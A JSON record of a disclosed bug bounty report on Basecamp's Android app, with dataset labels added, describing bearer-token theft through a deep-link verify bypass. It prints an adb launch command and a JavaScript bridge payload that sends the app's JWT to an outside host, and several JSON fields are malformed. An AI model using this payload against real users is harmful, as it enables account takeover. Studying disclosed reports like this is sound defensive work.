{
  "reported_to": "Basecamp",
  "reported_by": "danielllewellyn ",
  "title": "Able to steal bearer token from deep link",
  "content": "\nPre-requisities\nPrior to exploitation you would be required to know the \"account id\" of the user that you are attacking. Whilst this makes it difficult to attack an application in a generic way - the account is not secret information as it is included in any links to a user's basecamp organisation. E.g\nhttps://3.basecamp.com/5218370/\nAttack\nThe attack involves forcing the user to enter the application either by starting an intent from an application on the device already, or by triggering a deep link (which can be done by with e.g. a phishing email) . The link should be in this format:\nhttps://3.basecamp.com/<accountId>/verify?proceed_to=<attacker controlled URL>\nHere is a sample adb command that can be used to test the attack:\nCode 216 Bytes\n<image_0>\nThe second part of the attack involves redirecting someone using the turbo links API that is exposed through the javascript native bridge. Here is the example:\nCode 265 Bytes\n1<script>NativeApp.openNativeImageViewer(\"[{'download_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'preview_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'caption':'ViewImage'}]\", 0)</script>\nThis script executes 'openNativeImageViewer' and passes the download_url and preview_url. The preview_url is the most interesting, as it requires not user interaction. In order to render a preview image, the basecamp app sends the JWT header to the site, meaning that the 'preview_url' will receive that header.\nVulnerability\nThe clearest vulnerability is that the check to determine if a URL is an 'internal' URL allows it to by bypassed in a limited way by using the /verify? url along with a proceed_to that is attacker controlled.\nCode 667 Bytes\n1if (TuroblinksUrlHandler.contains(url, \"/verify?\", true)) {\n2                C3982h.nullCheck(url, \"$this$proceedToParam\");\n3                C3982h.nullCheck(url, \"$this$extractQueryParam\");\n4                C3982h.nullCheck(\"proceed_to\", \"queryKey\");\n5                String queryParameter = url.toUri().getQueryParameter(\"proceed_to\");\n6                url = queryParameter != null ? UrlKt.parseUrl(queryParameter) : null;\n7                C3982h.nullCheck(url);\n8            }\n9\n10 Intent intent10 = new Intent(context, WebViewActivity.class);\n11                    C1071a.addUrlsToIntent(url, intent10, \"intentUrl\", \"intentApiUrl\", null);\n12                    return intent10;\nImpact\nAn attacker could, without physical access to the device, retrieve a user's authentication tokens. A potentially compounding factor is that once a user has been exploited, it might be possible to continue the chain of attack by having that compromised user share links with other users who trust links sent by the compromised user.\n\n",
  "severity": "[",
  "bounty": 6337,
  "weaknesses": "[",
  "screenshots": "{",
  "image_0": "1adb shell am start -n com.basecamp.bc3/com.basecamp.bc3.activities.BasecampUrlFilterActivity https://3.basecamp.com/5218370/verify?proceed_to=https://haystack-production-storage.s3.eu-west-2.amazonaws.com/attack.html",
  "disclosed_date": 1648420380,
  "report_url": "https://hackerone.com/reports/1372667",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "MOBILE",
  "steps": "[",
  "Identify the target user's account ID from a Basecamp organization link (e.g., https": "//3.basecamp.com/5218370/)",
  "Craft a malicious deep link in the format": "https://3.basecamp.com/<accountId>/verify?proceed_to=<attacker controlled URL>",
  "vuln_description": "The vulnerability allows an attacker to steal a user's bearer token by exploiting a deep link verification bypass in Basecamp. By crafting a malicious deep link and leveraging the turbo links API, the attacker can redirect the user to a controlled URL, capturing the JWT header sent by the app for preview image rendering.",
  "reason": "The attack involves multiple components (deep link manipulation, JavaScript API exploitation) and subtle interactions between them (bypassing URL checks and leveraging the preview_url mechanism). Additionally, the attacker must understand the application's internal URL handling and the turbo links API, which is not commonly exploited in this manner.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "injection_classification": "}"
}